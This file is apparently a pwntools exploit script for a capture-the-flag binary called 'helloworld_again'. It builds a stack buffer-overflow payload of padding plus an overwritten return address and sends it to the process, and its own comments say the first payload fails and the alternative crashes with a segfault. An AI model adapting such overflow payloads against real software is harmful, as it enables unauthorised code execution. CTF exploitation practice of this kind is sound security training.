from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

# r = remote('ctf.adl.tw', 10000)
p = process('./helloworld_again')

# n = 65536 + 10 - (40 - 10 + 8)
n = 0
payload = b'helloworld' + b'0' * (40 - 10) + p64(0x40125b) + b'0' * n
# * This payload doesn't work

# payload = b'helloworld\0' + b'0' * (40 - 11) + p64(0x40125b) + b'0' * n
# * This one will cause the process to exit with -11 (SIGSEGV)

p.sendafter(b'!', payload)
# r.sendafter(b'!', payload)

p.interactive()
# r.interactive()
